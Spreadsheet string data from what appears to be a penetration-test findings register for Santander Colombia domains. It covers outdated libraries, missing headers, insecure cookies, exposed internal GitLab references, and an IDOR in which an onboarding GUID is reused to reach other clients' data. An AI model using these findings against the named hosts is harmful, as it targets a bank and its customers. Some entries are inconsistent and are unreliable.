    <t>MAN-67234bfeb4b68f2a93497be5</t>
  </si>
  <si>
    <t>SCO-24-CNMPA-015-VE-001</t>
  </si>
  <si>
    <t>Librería jQuery con vulnerabilidades asociadas</t>
  </si>
  <si>
    <t>CVE-2021-21252
CVE-2021-2125
CVE-2022-31147</t>
  </si>
  <si>
    <t xml:space="preserve">Se ha identificado que la aplicación utiliza una versión desactualizada de la librería jQuery con vulnerabilidades conocidas. Estas vulnerabilidades pueden ser explotadas por usuarios malintencionados para ejecutar código arbitrario, manipular el DOM o desencadenar ataques de Cross-Site Scripting (XSS), poniendo en riesgo la integridad y confidencialidad de la aplicación.
jDurante la revisión del activo, se han observado que la aplicación web hace uso de la librería javascript jQuery 1.17.0 en los siguientes recursos y con las siguientes vulnerabilidades asociadas.
URL de la librería:
https://garantia.santanderconsumer.co/lib/jquery-validation/dist/jquery.validate.min.js
Recursos que hacen uso de la librería:
• / - Raíz de la aplicación web
CVEs asociados a la versión de jQuery detectada:
• CVE-2021-21252: Regular Expression Denial of Service vulnerability
• CVE-2021-43306: ReDoS vulnerability in URL2 validation
• CVE-2022-31147: ReDoS vulnerability in url and URL2 validation
</t>
  </si>
  <si>
    <t>Se recomienda actualizar la librería javascript de jQuery a una versión más reciente que solucione estas vulnerabilidades. También puede ser beneficioso aplicar parches de seguridad si están  disponibles en los repositorios oficiales. Si la actualización no es posible, se debe considerar buscar alternativas a jQuery, implementar medidas de seguridad adicionales como, por ejemplo, la edición del código fuente o la eliminación de cualquier información que pueda inducir a descubrir su versión.</t>
  </si>
  <si>
    <t>Un usuario malintencionado podría buscar información sobre vulnerabilidades o exploits en función de la versión de jQuery utilizada por la aplicación para preparar un ataque dirigido sobre ella con mayor probabilidad de éxito. Algunos de los riesgos más significativos podrían ser:
• Exposición de datos sensibles.
• Ejecución de código malicioso.
• Interrupción o modificación de la funcionalidad de la aplicación que haga uso de la librería.</t>
  </si>
  <si>
    <t>MAN-672258bcb4b68f2a93494404</t>
  </si>
  <si>
    <t>SCO-24-CNMPA-015-VE-002</t>
  </si>
  <si>
    <t>Librería Bootstrap con vulnerabilidades asociadas</t>
  </si>
  <si>
    <t>CVE-2024-6531</t>
  </si>
  <si>
    <t>Se ha identificado que la aplicación utiliza una versión desactualizada de la librería Bootstrap con vulnerabilidades conocidas. Estas vulnerabilidades pueden ser explotadas por usuarios malintencionados para ejecutar código arbitrario, manipular el DOM o desencadenar ataques de Cross-Site Scripting (XSS), poniendo en riesgo la integridad y confidencialidad de la aplicación.
Durante la revisión del activo, se han observado que la aplicación web hace uso de la librería javascript Bootstrap 4.3.1 en los siguientes recursos y con las siguientes vulnerabilidades asociadas.
URL de la librería:
https://garantia.santanderconsumer.co/lib/bootstrap/dist/js/bootstrap.bundle.min.js
Recursos que hacen uso de la librería:
• / - Raíz de la aplicación web
CVEs asociados a la versión de jQuery detectada:
• CVE-2024-6531: Bootstrap Cross-Site Scripting (XSS) vulnerability</t>
  </si>
  <si>
    <t>Se recomienda actualizar la librería javascript de Bootstrap a una versión más reciente que solucione estas vulnerabilidades. También puede ser beneficioso aplicar parches de seguridad si están disponibles en los repositorios oficiales. Si la actualización no es posible, se debe considerar buscar alternativas a jQuery, implementar medidas de seguridad adicionales como, por ejemplo, la edición del código fuente o la eliminación de cualquier información que pueda inducir a descubrir su versión</t>
  </si>
  <si>
    <t>QA-WAS-c86595e9-ae9a-4760-b72a-a609d664997d</t>
  </si>
  <si>
    <t>https://garantia.santanderconsumer.co/</t>
  </si>
  <si>
    <t>Bootstrap es un framework CSS gratuito y de código abierto para el desarrollo web responsivo. Contiene plantillas de diseño basadas en HTML, CSS y JavaScript para tipografía, formularios, botones, navegación y otros componentes de la interfaz.
La aplicación web utiliza una biblioteca JavaScript que se sabe que contiene al menos una vulnerabilidad.</t>
  </si>
  <si>
    <t>QA-WAS-d8796841-871e-4953-b81d-eadc4a42fade</t>
  </si>
  <si>
    <t>La cookie no contiene el atributo ;secure;.</t>
  </si>
  <si>
    <t>Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo ;secure; a las cookies y obligue a que todas las peticiones sensibles se envíen a través de HTTPS.</t>
  </si>
  <si>
    <t>QA-WAS-1c198d2e-5d8e-4a1c-a75f-ca5e3a2c281e</t>
  </si>
  <si>
    <t>https://www.santander.com.co/rb_bf10849rjg?type=js3&amp;sn=v_4_srv_4_sn_54E3FC5B06B89ECF139F8770F2565A0F_perc_100000_ol_0_mul_1_app-3A0e06b2b0e5f9e5f4_1&amp;svrid=4&amp;flavor=post&amp;vi=CICFKCFMKABBKECGRNKUQPUCLTMUTESP-0&amp;modifiedSince=1744546783080&amp;rf=https%3A%2F%2Fwww.santander.com.co%2Fpg%2Fhost-to-host.html&amp;bp=3&amp;app=0e06b2b0e5f9e5f4&amp;crc=2110100888&amp;en=flo1gyf2&amp;end=1</t>
  </si>
  <si>
    <t>SC-25-CNMPA-002-CO-001</t>
  </si>
  <si>
    <t>Revelación de información interna en metadatos de documentos</t>
  </si>
  <si>
    <t>low</t>
  </si>
  <si>
    <t>3.7</t>
  </si>
  <si>
    <t xml:space="preserve">https://www.santander.com.co/recursos/archivos/, </t>
  </si>
  <si>
    <t>La aplicación web analizada alberga uno o más ficheros que contienen metadatos y que pueden
proporcionar información interna de la organización, tales como nombres de empleados, códigos
de usuario o versiones de software.</t>
  </si>
  <si>
    <t>Se recomienda eliminar toda la información contenida en los metadatos de los documentos
generados y/o publicados en la aplicación. De manera adicional se puede implementar un
procedimiento para controlar los documentos a publicar, de manera tal de garantizar que los
mismos no contengan información sensible de la organización en sus metadatos.</t>
  </si>
  <si>
    <t>La información contenida en los metadatos de los archivos identificados podría ser utilizada por un
atacante para obtener un mayor conocimiento de la organización, tecnologías utilizadas e incluso
nombres de usuarios. Con esta información el atacante puede planificar ataques de ingeniería social
o phishing dirigidos a determinados usuarios.</t>
  </si>
  <si>
    <t>SC-25-CNMPA-002-CO-002</t>
  </si>
  <si>
    <t>Fuga de información de servidores internos</t>
  </si>
  <si>
    <t>3.3</t>
  </si>
  <si>
    <t>https://www.santander.com.co/README.md</t>
  </si>
  <si>
    <t xml:space="preserve">Durante las pruebas realizadas se ha detectado un fichero
https://www.santander.com.co/README.md en el que se muestra cierta información destinada
a desarrolladores, y entre la que se incluyen referencias a un servidor de GitLab interno en
http://gitlabsnc.cosanpre.corp:8080: </t>
  </si>
  <si>
    <t>Se recomienda eliminar el fichero https://www.santander.com.co/README.md, ya que es este
fichero el que expone la información interna descrita en esta vulnerabilidad.</t>
  </si>
  <si>
    <t>Un atacante podría utilizar esta vulnerabilidad para obtener información del direccionamiento
interno del sistema, pudiendo llegar a localizar otros activos vulnerables en la red o mapear la red
interna.</t>
  </si>
  <si>
    <t>CSP Violations</t>
  </si>
  <si>
    <t>Potentially insecure policy</t>
  </si>
  <si>
    <t>(An insecure CSP configuration was detected.) The Content Security Policy is not effective at meeting the security objectives defined for preventing Cross Site Scripting attacks, such as:
Preventing loading of unauthorized content resources and scripts.
Preventing clickjacking and other nested frame attacks.
Ensuring that web forms and links are behaving as intended.
- To improve your configuration, make sure to:
Implement directives that set valid and complete source restrictions for loading dynamic content ('script-src', 'object-src', 'default-src').
Avoid the use of unsafe directives such as ‘unsafe-eval’ and ‘unsafe-inline’.
Avoid typos or otherwise invalid CSP directives.
Avoid wildcards, host-based allowlists, or bare URL schemes such as ‘HTTP’ in source directives.
Use specific sources, such as "https://www.example.com". Remove generalizations, such as "http:", "https:", "https://*.com".See Content Security Policy Configurations for more information.</t>
  </si>
  <si>
    <t>CSP Configurations</t>
  </si>
  <si>
    <t>Resource blocked by Content Security Policy (CSP)</t>
  </si>
  <si>
    <t>(Resource blocked by Content Security Policy (CSP)) The page attempted to load a resource that was blocked by the CSP policy. The presence of such error suggests that:
The website content and security policies are incongruent.
The website unknowingly includes third-party content.
Malicious code is injected into the website but blocked by the CSP.
- Review the website for CSP violation messages. Detailed information about the existing violations is available in the evidence details section and you may be able to find them on your browser of choice, on developer tools, under the Console tab. See Content Security Policy Violations for more information.</t>
  </si>
  <si>
    <t>QA-WAS-7f652953-dfb9-450d-a991-2178df69d483</t>
  </si>
  <si>
    <t>Insecure Transport</t>
  </si>
  <si>
    <t>7.6</t>
  </si>
  <si>
    <t>waf.api.cdt.santander.com.co</t>
  </si>
  <si>
    <t>Un enlace es accesible a través de una conexión insegura, es decir, HTTP.</t>
  </si>
  <si>
    <t>Asegúrese de que el sitio web de destino sea accesible solo a través de HTTPS. Si se reciben solicitudes no HTTPS, el servidor debe redirigir la solicitud a HTTPS. También se recomienda utilizar el encabezado de respuesta Strict-Transport-Security para garantizar que los navegadores web utilicen solo HTTPS al realizar solicitudes al servidor.</t>
  </si>
  <si>
    <t>Los atacantes que intentan robar credenciales de inicio de sesión, IDs de sesión u otra información sensible. Bypaseando SSL ingresando HTTP en lugar de HTTPS. Enviando URLs inseguras de páginas protegidas a la víctima (por ejemplo, página de login) para engañar a la víctima y hacer que acceda a las páginas privilegiadas a través de HTTP.</t>
  </si>
  <si>
    <t>Descargadas como falso positivo</t>
  </si>
  <si>
    <t>QA-WAS-775ac617-f069-4c25-9e89-3ae97c19271d</t>
  </si>
  <si>
    <t>waf.api.dev.mb.cdt.santander.com.co</t>
  </si>
  <si>
    <t>QA-WAS-a5b4a20b-2c92-4ac8-a002-c9a7a5a5008c</t>
  </si>
  <si>
    <t>waf.api.ocu.mb.cdt.santander.com.co</t>
  </si>
  <si>
    <t>QA-WAS-fb427064-eaac-4bd4-8073-8d5c17e07800</t>
  </si>
  <si>
    <t>waf.api.qa.mb.cdt.santander.com.co</t>
  </si>
  <si>
    <t>QA-WAS-ccd9d8b1-050f-4282-9dbd-5ba72c503cbb</t>
  </si>
  <si>
    <t>waf.api.stg.mb.cdt.santander.com.co</t>
  </si>
  <si>
    <t>MAN-68527f176c975521ca3b900e</t>
  </si>
  <si>
    <t>SC-25-CNMPA-004-VE-001</t>
  </si>
  <si>
    <t xml:space="preserve">Denegación de Servicio </t>
  </si>
  <si>
    <t xml:space="preserve">Durante las pruebas realizadas se ha observado que es posible degradar el rendimiento de la aplicación y el servidor remoto que la sustenta. Pudiendo llegar a realizar una denegación de servicio de la infraestructura e impidiendo que la aplicación pueda prestar servicio a los usuarios legítimos de la aplicación. </t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>MAN-68527f176c975521ca3b900f</t>
  </si>
  <si>
    <t>SC-25-CNMPA-004-VE-002</t>
  </si>
  <si>
    <t>QA-WAS-58aa7e6f-af2d-4e5c-b3d0-b96eef280924</t>
  </si>
  <si>
    <t>4.3</t>
  </si>
  <si>
    <t>La Cookie no contiene el atributo &amp;quot;HTTPOnly&amp;quot;.</t>
  </si>
  <si>
    <t>Si el riesgo asociado a una cuenta comprometida es alto, aplique el atributo &amp;quot;HTTPOnly&amp;quot; a las cookies.</t>
  </si>
  <si>
    <t>QA-WAS-83622d31-f369-4ec0-8249-e91842d59275</t>
  </si>
  <si>
    <t>QA-WAS-91e1b24f-bb4c-4a75-a257-68ed7a1e7104</t>
  </si>
  <si>
    <t>QA-WAS-aaeaa952-a1e5-4917-9a3e-f47d3cc53586</t>
  </si>
  <si>
    <t>QA-WAS-bc6901c6-6f2b-4757-a838-b4f4fbadce58</t>
  </si>
  <si>
    <t>QA-WAS-14fc1bec-b648-4145-9683-952600d6ce0a</t>
  </si>
  <si>
    <t>La cookie no contiene el atributo &amp;quot;seguro&amp;quot;.</t>
  </si>
  <si>
    <t>Si el riesgo asociado a una cuenta comprometida es alto, aplique el atributo "seguro" a las cookies y obligue a que todas las solicitudes sensibles se envíen a través de HTTPS.</t>
  </si>
  <si>
    <t>QA-WAS-28e138a7-0664-4306-87b5-1ee1724e4a94</t>
  </si>
  <si>
    <t>QA-WAS-39608b13-7d68-4586-936f-0dd0b1efa2d0</t>
  </si>
  <si>
    <t>QA-WAS-c391a6a6-2d87-4361-ad1c-95a3a4b734cc</t>
  </si>
  <si>
    <t>QA-WAS-87c5919d-0c1e-4c93-a26f-8bcffa3c5aba</t>
  </si>
  <si>
    <t>https://www.santander.com.co/rb_bf10849rjg?type=js3&amp;sn=v_4_srv_1_sn_E34D61E9BF330463E52FC0DA8D8BD3BF_perc_100000_ol_0_mul_1_app-3A0e06b2b0e5f9e5f4_1&amp;svrid=1&amp;flavor=post&amp;vi=GUUSGWRWAHICWGWGNGMQWBLDRGUEAJFF-0&amp;modifiedSince=1749002768910&amp;bp=3&amp;app=0e06b2b0e5f9e5f4&amp;crc=2362357479&amp;en=flo1gyf2&amp;end=1</t>
  </si>
  <si>
    <t>La página web puede ser enmarcada. Esto significa que los ataques de clickjacking contra los usuarios son posibles.</t>
  </si>
  <si>
    <t>Los mecanismos comunes de prevención de clickjacking incluyen:X-Frame-Options: Este es un encabezado de respuesta HTTP que se utiliza para prevenir el enmarcamiento de la página web.Código JavaScript Framekiller: Se puede utilizar un código JS especial para prevenir que un usuario malintencionado enmarque la página. Este método es menos confiable que el uso de X-Frame-Options.</t>
  </si>
  <si>
    <t>QA-WAS-ae5ea8b4-9a41-4c6b-91d2-5e16d298a80b</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/icons/small/</t>
  </si>
  <si>
    <t>El servidor web presenta una lista de directorios.</t>
  </si>
  <si>
    <t>La presencia de un directorio navegable no implica necesariamente una vulnerabilidad. Determine si la lista del directorio está destinada a ser mostrada. Verifique que ningún archivo en el directorio contenga contenido que no deba ser servido por la aplicación web.</t>
  </si>
  <si>
    <t>QA-WAS-8911e6bb-832d-4a7f-9c6a-331a8503322d</t>
  </si>
  <si>
    <t>https://portalrecaudos.santander.com.co/#/</t>
  </si>
  <si>
    <t>Bootstrap es un marco CSS gratuito y de código abierto dirigido al desarrollo web responsivo. Contiene plantillas de diseño basadas en HTML, CSS y JavaScript para tipografía, formularios, botones, navegación y otros componentes de la interfaz.La aplicación web está utilizando una biblioteca de JavaScript que se sabe que contiene al menos una vulnerabilidad.</t>
  </si>
  <si>
    <t>Por favor, consulte la información proporcionada en la sección de respuestas. También verifique los avisos de seguridad del proveedor relacionados con la versión vulnerable de la biblioteca.</t>
  </si>
  <si>
    <t>Prospera</t>
  </si>
  <si>
    <t>QA-WAS-53d76729-7897-4c91-993e-34482c0c10a6</t>
  </si>
  <si>
    <t>https://prospera.santanderconsumer.co/san</t>
  </si>
  <si>
    <t>La cookie no contiene el atributo &amp;quot;HTTPOnly&amp;quot;.</t>
  </si>
  <si>
    <t>QA-WAS-3f999e8b-05ed-497f-b65a-0d3a834db4b1</t>
  </si>
  <si>
    <t>QA-WAS-baacfa44-b66c-4682-8f78-1f5ba0bc63ba</t>
  </si>
  <si>
    <t>https://vpnco1.santander.com.co/+CSCOE+/message.html?mc=2</t>
  </si>
  <si>
    <t>Se ha detectado un archivo, un directorio o una lista de directorios potencialmente confidenciales en el servidor web.</t>
  </si>
  <si>
    <t>Verifique que se permita el acceso a este archivo o directorio. Si es necesario, elimínelo o aplique controles de acceso a él.</t>
  </si>
  <si>
    <t>MAN-6862770e6c975521ca41b5ab</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-AP-001</t>
  </si>
  <si>
    <t>www.cdt.santander.com.co</t>
  </si>
  <si>
    <t>Esta vulnerabilidad permite a los atacantes evadir la autorización y acceder a los recursos directamente modificando el valor de un parámetro utilizado para apuntar directamente a un objeto. Dichos recursos pueden ser entradas de bases de datos que pertenecen a otros usuarios, archivos en el sistema y más. Esto se debe al hecho de que la aplicación toma la entrada proporcionada por el usuario y la utiliza para  recuperar un objeto sin realizar suficientes comprobaciones de autorización.</t>
  </si>
  <si>
    <t>Se recomienda introducir mecanismos de validación basado en accesos por usuario o roles, para acceder a la información identificada y comprobar en el lado del servidor que el usuario tiene privilegios de acceso a la información consultada. Se recomienda aplicar las recomendaciones sobre cualquier operación del aplicativo que referencie a un objeto enviado en un parámetro de una petición, los cuales podrán ser modificados por el usuario antes de su envío al servidor.</t>
  </si>
  <si>
    <t>Un atacante puede evadir el sistema de autorización y acceder a los recursos del aplicativo directamente modificando el valor de un parámetro utilizado para apuntar directamente a un objeto, en este caso, la cédula de cualquier cliente. Dichos recursos pueden ser registros, entradas de basesde datos que pertenecen a otros usuarios, archivos en el sistema o cualquier tipo de información a la que no debería tener acceso de manera previa, comprometiendo su confidencialidad ante consultas, o integridad o disponibilidad ante su modificación.</t>
  </si>
  <si>
    <t>MAN-68678d976c975521ca42a318</t>
  </si>
  <si>
    <t>SC-25-CNMPO-003-AP-001</t>
  </si>
  <si>
    <t>Recidam.olimpiait.com</t>
  </si>
  <si>
    <t>Las "Referencias Inseguras a Objetos de manera Directa" (IDOR) se producen cuando una aplicación proporciona acceso directo a los objetos en función de la entrada proporcionada AB409por el usuario (Normalmente un identificador de objeto, independientemente de su predictibilidad). Esta vulnerabilidad permite a los atacantes evadir la autorización y acceder a los recursos directamente modificando el valor de un parámetro utilizado para apuntar directamente a un objeto. Dichos recursos pueden ser entradas de bases de datos que pertenecen a otros usuarios, archivos en el sistema y más. Esto se debe al hecho de que la aplicación toma la entrada proporcionada por el usuario y la utiliza para recuperar un objeto sin realizar suficientes comprobaciones de autorización.
El proceso de onboarding de httpX://www.cdt.santander.com.co tiene un flujo de autenticación
biométrico. Este proceso, realiza diferentes peticiones de validación sobre dominios de olimpiait.com
A cada flujo, se le asigna un valor con una cadena 8-4-4-12, que son 32 valores hexadecimales únicos
para cada cliente en cada flujo
Una vez el proceso se ha completado, se realiza una petición sobre la funcionalidad ConsultarProceso
donde se pueden identificar todos los datos en claro
Para evidenciar la falta de autorización, se ha iniciado el flujo con otros datos de cliente y se ha
reutilizado el código único y hexadecimal (ProcesoConvenioGUID) para, desde el usuario de Juan
Carlos Navarrete, el cual tiene el Auth Bearer token acabado en […]PJ08, visualizar información
sensible de otros clientes. A continuación, reutilizando dicho token y alterando el parámetro
ProcesoConvenioGUID, se puede identificar información sensible de otro cliente que tiene un flujo de
onboarding
Adicionalmente, este ID se puede automatizar, no existiendo ningún tipo de control ante peticiones
masivas, pudiendo llegar a identificar cualquier cliente dado de alta
Cabe destacar, que, tras 68 peticiones, no se ha identificado ningún GUID válido, pero con el tiempo
suficiente, se podría llegar a identificar clientes reales.</t>
  </si>
  <si>
    <t>Se recomienda introducir mecanismos de validación basado en accesos por usuario o roles, para acceder a la información identificada y comprobar en el lado del servidor que el usuario tiene privilegios de acceso a la información consultada. En este caso, dado que el token de sesión JWT (Autorización) identifica al usuario y su perfilado en el aplicativo, debe validarse dicho usuario y verificar si su perfilado tiene permisos sobre el objeto a consultar, crear, modificar, o borrar. Se recomienda aplicar las recomendaciones sobre cualquier operación del aplicativo que referencie a un objeto enviado en un parámetro de una petición, los cuales podrán ser modificados por el usuario antes de su envío al servidor.</t>
  </si>
  <si>
    <t>Un atacante puede evadir el sistema de autorización y acceder a los recursos del aplicativo directamente modificando el valor de un parámetro utilizado para apuntar directamente a un objeto, en este caso, el identificador de un usuario para actuar sobre su foto de perfil. Dichos recursos pueden ser registros, entradas de bases de datos que pertenecen a otros usuarios, archivos en el sistema o cualquier tipo de información a la que no debería tener acceso de manera previa, comprometiendo su confidencialidad ante consultas, o integridad o  Disponibilidad ante su modificación.</t>
  </si>
  <si>
    <t>SC-25-CNMPO-008-CO-001</t>
  </si>
  <si>
    <t>Información en metadatos</t>
  </si>
  <si>
    <t>Ciertos tipos de ficheros, como imágenes, PDFs o documentos de Microsoft Office almacenan información en forma de metadatos, tales como autor, fecha de creación, nombre de equipo, direccionamiento IP o tecnologías utilizadas. La aplicación web analizada alberga uno o más ficheros que contienen metadatos y que pueden  proporcionar información interna de la organización, tales como nombres de empleados, códigos de usuario o versiones de software.</t>
  </si>
  <si>
    <t>Se recomienda eliminar toda la información contenida en los metadatos de los documentos
generados y/o publicados en la aplicación. De manera adicional se puede implementar un
procedimiento para controlar los documentos a publicar, de manera tal de garantizar que los
mismos no contengan información sensible de la organización en sus metadatos</t>
  </si>
  <si>
    <t>La información contenida en los metadatos de los archivos identificados podría ser utilizada por un
atacante para obtener un mayor conocimiento de la organización, tecnologías utilizadas e incluso
nombres de usuarios. Con esta información el atacante puede planificar ataques de ingeniería social
o Phishing dirigidos a determinados usuarios.</t>
  </si>
  <si>
    <t>SC-25-CNMPO-008-CO-002</t>
  </si>
  <si>
    <t>https://servicios.santander.com.co/webclien
t/Login.xhtml</t>
  </si>
  <si>
    <t xml:space="preserve">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(Cipher-BlockChaining) son potencialmente vulnerables a este tipo ataques. </t>
  </si>
  <si>
    <t xml:space="preserve">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t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>MAN-685aac916c975521ca412395</t>
  </si>
  <si>
    <t>SC-25-CNMPO-005-AP-001</t>
  </si>
  <si>
    <t>https://confirming-factoring.santander.com.co/</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t xml:space="preserve">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 </t>
  </si>
  <si>
    <t>SC-25-CNMPO-005-CO-002</t>
  </si>
  <si>
    <t>MAN-6862a1f46c975521ca41b5d6</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO002</t>
  </si>
  <si>
    <t>Ausencia de cabecera X-Frame-Options</t>
  </si>
  <si>
    <t>6.1</t>
  </si>
  <si>
    <t>Assets.cdt.santander.com.co</t>
  </si>
  <si>
    <t>La ausencia de la cabecera X-Frame-Options permite que el sitio web sea embebido en un &lt;iframe&gt; externo, habilitando posibles ataques de clickjacking.</t>
  </si>
  <si>
    <t>Configurar la cabecera X-Frame-Options con el valor DENY o SAMEORIGIN para prevenir que el sitio
sea cargado en marcos externos y mitigar ataques de clickjacking.
Incluye la cabecera X-Frame-Options en todas las respuestas de contenido HTML con alguno de los
siguientes valores:
Opción más segura:
X-Frame-Options: DENY
(No permite que la página se cargue en ningún iframe)
Opción balanceada:
X-Frame-Options: SAMEORIGIN
(Solo permite carga en iframe si el origen es el mismo, útil para portales que usan marcos
internamente)</t>
  </si>
  <si>
    <t>Un atacante puede engañar a un usuario para que interactúe con elementos invisibles del sitio legítimo embebido en un sitio malicioso, provocando acciones no deseadas (ej. Aprobar transacciones, cambiar configuraciones).</t>
  </si>
  <si>
    <t>MAN-6862a3e06c975521ca41b5d7</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO003</t>
  </si>
  <si>
    <t>Even.cdt.santander.com.co</t>
  </si>
  <si>
    <t>MAN-6862a3e06c975521ca41b5d8</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO004</t>
  </si>
  <si>
    <t>Gdcs.prod.mb.cdt.santander.com.co</t>
  </si>
  <si>
    <t>MAN-6862a3e06c975521ca41b5d9</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO005</t>
  </si>
  <si>
    <t>Teal.cdt.santander.com.co</t>
  </si>
  <si>
    <t>MAN-6862aa706c975521ca41b5da</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO006</t>
  </si>
  <si>
    <t>Ausencia de cabecera X-Content-Options</t>
  </si>
  <si>
    <t>6.2</t>
  </si>
  <si>
    <t>Si esta cabecera no está presente o no está configurada correctamente, los navegadores pueden intentar "adivinar" el tipo de contenido (MIME sniffing), incluso si el servidor ha especificado uno. Esto puede llevar a que se interpreten archivos como ejecutables o scripts cuando no deberían serlo.</t>
  </si>
  <si>
    <t>Establecer la cabecera X-Content-Type-Options con el valor nosniff en todas las respuestas HTTP
para evitar que el navegador haga MIME sniffing.</t>
  </si>
  <si>
    <t>Un atacante podría subir un archivo aparentemente inofensivo (por ejemplo, .txt) que el navegador
podría interpretar como un script (.js), provocando una ejecución de código no deseada (XSS).</t>
  </si>
  <si>
    <t>MAN-6862ab676c975521ca41b5db</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO007</t>
  </si>
  <si>
    <t>6.3</t>
  </si>
  <si>
    <t>MAN-6862ab676c975521ca41b5dc</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO008</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO009</t>
  </si>
  <si>
    <t>Ataque de temporización del cálculo de MAC de TLS (LUCKY13)</t>
  </si>
  <si>
    <t>3.2</t>
  </si>
  <si>
    <t>Se ha detectado que el servidor afectado utiliza algoritmos de cifrado CBC sobre TLS, por lo que se ve afectado por la vulnerabilidad "Lucky13". Todas las suites de cifrado TLS, incluido "Cipher Block Chaining", son potencialmente vulnerables a este tipo de ataque. Este ataque consiste en detectar pequeñas diferencias de tiempo cuando se generan errores TLS al enviar solicitudes maliciosas al servidor. Con estos ataques es posible descifrar bloques TLS, aunque el número de solicitudes depende del tipo de conexión, el ruido y el algoritmo MAC utilizado.</t>
  </si>
  <si>
    <t>Se ha detectado que es posible utilizar mecanismos de cifrado considerados inseguros en las comunicaciones con servidores, lo que podría permitir a un atacante comprometer la confidencialidad de la información intercambiada entre un cliente y el servidor, y en algunos casos también provocar la indisponibilidad del servidor.</t>
  </si>
  <si>
    <t>Se recomienda habilitar conjuntos de cifrado robustos como TLS 1.2 o TLS 1.3 y deshabilitar
protocolos débiles como TLS 1.0 y TLS 1.1. Además, deshabilitar todos los algoritmos CBC.</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO010</t>
  </si>
  <si>
    <t>Ausencia de cabecera Referrer-Policy</t>
  </si>
  <si>
    <t>3.8</t>
  </si>
  <si>
    <t>Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Referrer-Policy. Es una cabecera de seguridad HTTP que controla cuánta información del origen (URL de referencia) se envía al hacer solicitudes desde una página web. Sirve para proteger datos sensibles evitando que se filtren al navegar entre sitios o cargar recursos externos.</t>
  </si>
  <si>
    <t>Configurar la cabecera Referrer-Policy con una directiva adecuada que limite la exposición de
información en las solicitudes salientes, alineándola con las necesidades de seguridad y privacidad
de la aplicación. Esto ayuda a prevenir la fuga de datos sensibles hacia dominios externos.</t>
  </si>
  <si>
    <t>Sin esta cabecera, los navegadores pueden enviar URLs completas (incluyendo parámetros
sensibles) como referencias a sitios externos al hacer clic en enlaces o al cargar recursos externos.
Esto puede exponer información confidencial como tokens, IDs de sesión, parámetros de búsqueda,
etc., facilitando ataques de tipo leakage de datos, phishing o reconocimiento de estructura interna de la
aplicación</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO011</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO012</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO013</t>
  </si>
  <si>
    <t>Bo.prod.cc.cdt.santander.com.co</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO014</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO015</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO016</t>
  </si>
  <si>
    <t>Ausencia de cabecera Cross-Origin-Embedder-Policy</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>Implementar la cabecera Cross-Origin-Embedder-Policy con una directiva adecuada que asegure un entorno de ejecución aislado y controlado, limitando la carga de recursos de terceros sin permisos explícitos. Esto refuerza la seguridad del contexto de ejecución en el navegador</t>
  </si>
  <si>
    <t>Sin esta cabecera, la aplicación permite la carga de recursos de origen cruzado sin las protecciones necesarias. Esto impide que el sitio se ejecute en un contexto completamente aislado, lo cual es un requisito para ciertas funciones seguras como el uso compartido de memoria (SharedArrayBuffer).También puede facilitar ataques de canal lateral o filtrado de datos mediante contenido embebidode terceros</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO017</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO018</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO019</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO020</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO021</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO022</t>
  </si>
  <si>
    <t>Ausencia de cabecera Cross-Origin-Resource-Policy</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>Se recomienda establecer la cabecera Cross-Origin-Resource-Policy para controlar desde qué orígenes pueden cargarse los recursos, limitando el acceso solo a los necesarios y protegiendo contra el uso indebido desde otros sitios. Esto ayuda a reducir la exposición del contenido a entornos no confiables.</t>
  </si>
  <si>
    <t>El uso de la cabecera Cross-Origin-Resource-Policy ayuda a mitigar los ataques especulativos de sidechannel, así como los ataques de Cross-Site Scripting. Esta política es la única forma de proteger las imágenes de ataques Spectre.</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO023</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO024</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO025</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO026</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO027</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO028</t>
  </si>
  <si>
    <t>Ausencia de cabecera Cross-Origin-Opener-Policy</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t xml:space="preserve">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 </t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO029</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO030</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO031</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO032</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO033</t>
  </si>
  <si>
    <t>SC-25-CNMPO-007-CO034</t>
  </si>
  <si>
